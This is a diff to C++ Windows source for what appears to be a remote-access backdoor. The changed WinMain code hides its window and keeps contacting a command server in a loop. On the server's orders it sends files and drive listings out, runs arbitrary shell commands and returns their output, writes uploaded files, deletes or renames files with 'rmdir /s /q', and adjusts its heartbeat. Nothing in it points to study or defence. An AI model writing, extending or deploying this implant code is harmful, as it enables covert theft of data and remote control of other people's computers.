@@ -32,6 +32,12 @@
 using namespace std;
 
 
+#pragma comment(linker, "/subsystem:windows /entry:WinMainCRTStartup")
+// #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
+// #pragma comment(linker, "/subsystem:console /entry:mainCRTStartup")
+// #pragma comment(linker, "/subsystem:console /entry:WinMainCRTStartup")
+
+
 HANDLE g_mutex_handle = 0;
 
 
@@ -190,63 +196,11 @@ int clear() {
 
 
 
-int mytestfunc() {
-	int ret = 0;
-
-	//ret = uploadHttpsFile("test.txt");
-
-	PacketParcel https(TRUE);
-
-	ret = https.postCmd(CMD_ONLINE,0,0);
-
-	ret = https.postFile("test.txt", MISSION_TYPE_FILE);
-
-	ret = https.postCmd(CMD_QUERY_OPERATOR,0,0);
-
-	return 0;
-
-	PacketParcel http(TRUE);
-
-	ret = http.postCmd(CMD_ONLINE,0,0);
-
-	ret = http.postFile("test.txt", MISSION_TYPE_FILE);
-
-	ret = http.postCmd(CMD_QUERY_OPERATOR, 0, 0);
-
-	return ret;
-}
 
 
 
-int getProc() {
-	int ret = 0;
 
-// 	WCHAR url[1024];
-// 	WCHAR wstruuid[256];
-// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
-// 	WCHAR wstrcmd[256];
-// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
-// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);
 
-	PacketParcel packet(FALSE);
-
-	ret = packet.m_protocol->getCmd(CMD_ONLINE);
-
-	while (TRUE)
-	{
-		ret = packet.m_protocol->getCmd(CMD_QUERY_OPERATOR);
-		if (packet.m_protocol->m_respLen == 4 && *(DWORD*)packet.m_protocol->m_resp== INVALID_RESPONSE)
-		{
-
-		}
-		else if(memcmp(packet.m_protocol->m_resp,CMD_SEND_DD_DATA,sizeof(CMD_SEND_DD_DATA)) == 0){
-			PACKET_DATA_HEADER* file = (PACKET_DATA_HEADER*)packet.m_protocol->m_resp;
-
-		}
-	}
-
-	return ret;
-}
 
 
 
@@ -255,7 +209,6 @@ int __stdcall fileMission() {
 
 	int ret = 0;
 	
-
 	PacketParcel packet(TRUE);
 
 	while (TRUE)
@@ -285,7 +238,7 @@ int __stdcall fileMission() {
 			ptr = ptr + 1 + fnl;
 
 			MY_CMD_PACKET* pack = (MY_CMD_PACKET*)ptr;
-
+			/*
 			if (pack->type == MISSION_TYPE_DRIVE) {
 				char drivers[128];
 				int drivers_len = getDrivers(drivers, sizeof(drivers));
@@ -298,10 +251,12 @@ int __stdcall fileMission() {
 					delete sendbuf;
 				}		
 			}
-			else if (pack->type == MISSION_TYPE_FILE || pack->type == MISSION_TYPE_DIR)
+			else 
+			*/
+			if (pack->type == MISSION_TYPE_DRIVE || pack->type == MISSION_TYPE_FILE || pack->type == MISSION_TYPE_DIR)
 			{
 				*(pack->value + pack->len) = 0;
-				ret = packet.postFile(pack->value,pack->type);
+				//ret = packet.postFile(pack->value,pack->type);
 			}
 			else if (pack->type == COMMAND_TYPE_TERMINATE)
 			{
@@ -329,9 +284,9 @@ int __stdcall fileMission() {
 			else if (pack->type == MISSION_TYPE_UPLOAD)
 			{
 				string fn = string(pack->value, pack->len);
-				MY_CMD_PACKET * pack2 = (MY_CMD_PACKET*)((char*)pack + sizeof(MY_CMD_PACKET) + pack->len);
-				char* file = pack2->value;
-				int filesize = pack2->len;
+				char * pack2 = (char*)pack + sizeof(MY_CMD_PACKET) + pack->len;
+				char* file = pack2 + sizeof(int);
+				int filesize = *(int*)pack2;
 				int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
 			}
 			else if (pack->type == MISSION_TYPE_DELFILE)
@@ -360,10 +315,10 @@ int __stdcall fileMission() {
 				else {
 
 				}
-				MY_CMD_PACKET* pack2 = (MY_CMD_PACKET*)((char*)pack + sizeof(MY_CMD_PACKET) + pack->len);
-				string dfn = string(pack2->value, pack2->len);
+				char* pack2 = (char*)pack + sizeof(MY_CMD_PACKET) + pack->len;
+				int dfnlen = *(int*)pack2;
+				string dfn = string(pack2 + sizeof(int), dfnlen);
 
-				int ret = 0;
 				char* data = 0;
 				int filesize = 0;
 				ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
@@ -389,10 +344,9 @@ int __stdcall fileMission() {
 }
 
 
+
 int __stdcall cmdMission() {
 	int ret = 0;
-
-	
 
 	PacketParcel packet(TRUE);
 
@@ -465,20 +419,13 @@ int __stdcall cmdMission() {
 }
 
 
-
-
-#pragma comment(linker, "/subsystem:windows /entry:WinMainCRTStartup")
-// #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
-// #pragma comment(linker, "/subsystem:console /entry:mainCRTStartup")
-// #pragma comment(linker, "/subsystem:console /entry:WinMainCRTStartup")
-
-
-
 //compress,encrypt functions
 
 int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
 {
 	int ret = 0;
+
+	//ret = PathIsDirectoryA("c:\\");
 
 	ret = init();
 
@@ -490,24 +437,120 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 // 		CloseHandle(ht);
 // 	}
 
-	HANDLE htf = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fileMission, 0, 0, 0);
-	if (htf)
-	{
-		CloseHandle(htf);
-	}
-	HANDLE htc = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)cmdMission, 0, 0, 0);
-	if (htc)
-	{
-		CloseHandle(htc);
-	}
+// 	HANDLE htf = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fileMission, 0, 0, 0);
+// 	if (htf)
+// 	{
+// 		CloseHandle(htf);
+// 	}
+// 	HANDLE htc = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)cmdMission, 0, 0, 0);
+// 	if (htc)
+// 	{
+// 		CloseHandle(htc);
+// 	}
 
 	while (TRUE)
 	{
-
 		PacketParcel packet(TRUE);
 
 		ret = packet.postCmd(CMD_ONLINE, 0, 0);
 
+		int datalen = packet.m_datalen;
+		char* data = packet.m_data;
+		if (datalen > 4 && *(int*)data == DATA_PACK_TAG)
+		{
+			PACKET_HEADER* hdr = (PACKET_HEADER*)(data);
+			string server = string((char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
+			string id = string((char*)hdr->hdr.hostname, hdr->hdr.hostname_len);
+			if (memcmp(hdr->hdr.cmd, CMD_BRING_COMMAND, lstrlenA(CMD_BRING_COMMAND)) == 0)
+			{
+				MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(data + sizeof(PACKET_HEADER));
+				if (inpack->type == MISSION_TYPE_DRIVE || inpack->type == MISSION_TYPE_FILE || inpack->type == MISSION_TYPE_DIR)
+				{
+					string filename = string(inpack->value, inpack->len);
+					packet.postFile(filename, inpack->type, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
+				}
+				else if (inpack->type == MISSION_TYPE_CMD)
+				{
+					string cmd = string(inpack->value, inpack->len);
+					ret = shell(cmd.c_str());
+
+					packet.postFile(CMD_RESULT_FILENAME,0, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
+
+					//DeleteFileA(CMD_RESULT_FILENAME);
+				}
+				else if (inpack->type == COMMAND_TYPE_TERMINATE)
+				{
+					int subcmd = *(int*)((char*)inpack + sizeof(MY_CMD_PACKET));
+					if (subcmd == COMMAND_TYPE_TERMINATE)
+					{
+					}
+					MyJson json(JSON_CONFIG_FILENAME);
+					json.insert(KEYNAME_DEAD_STATUS, "true", JSON_TYPE_STRING);
+					json.saveFile();
+
+					//ret = packet.postCmd(CMD_GET_CMD, 0, 0);
+
+					ExitProcess(0);
+				}
+				else if (inpack->type == COMMAND_TYPE_HEARTBEAT)
+				{
+					string s = string(inpack->value, inpack->len);
+					int sec = atoi(s.c_str());
+					g_interval = sec * 1000;
+					MyJson json(JSON_CONFIG_FILENAME);
+					json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
+					json.saveFile();
+				}
+				else if (inpack->type == MISSION_TYPE_UPLOAD)
+				{
+					string fn = string(inpack->value, inpack->len);
+					char* pack2 = (char*)inpack + sizeof(MY_CMD_PACKET) + inpack->len;
+					int filesize = *(int*)pack2;
+					char* file = pack2 + sizeof(int);
+					
+					int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
+				}
+				else if (inpack->type == MISSION_TYPE_DELFILE)
+				{
+					string fn = string(inpack->value, inpack->len);
+
+					ret = PathIsDirectoryA(fn.c_str());
+					if (ret & FILE_ATTRIBUTE_DIRECTORY)
+					{
+						//rmdir /s/q
+						string cmd = string("rmdir /s /q ") + fn;
+						ret = shell(cmd.c_str());
+					}
+					else {
+						ret = DeleteFileA(fn.c_str());
+					}
+				}
+				else if (inpack->type == MISSION_TYPE_RENFILE)
+				{
+					string sfn = string(inpack->value, inpack->len);
+					ret = PathIsDirectoryA(sfn.c_str());
+					if (ret & FILE_ATTRIBUTE_DIRECTORY)
+					{
+						continue;
+					}
+					else {
+
+					}
+					char* pack2 = (char*)inpack + sizeof(MY_CMD_PACKET) + inpack->len;
+					int dfnlen = *(int*)pack2;
+					string dfn = string(pack2 + sizeof(int), dfnlen);
+
+					char* data = 0;
+					int filesize = 0;
+					ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
+					if (ret)
+					{
+						ret = FileHelper::fileWriter(dfn.c_str(), data, filesize, TRUE);
+						ret = DeleteFileA(sfn.c_str());
+					}
+				}
+			}
+		}
 		Sleep(g_interval);
 	}	
 
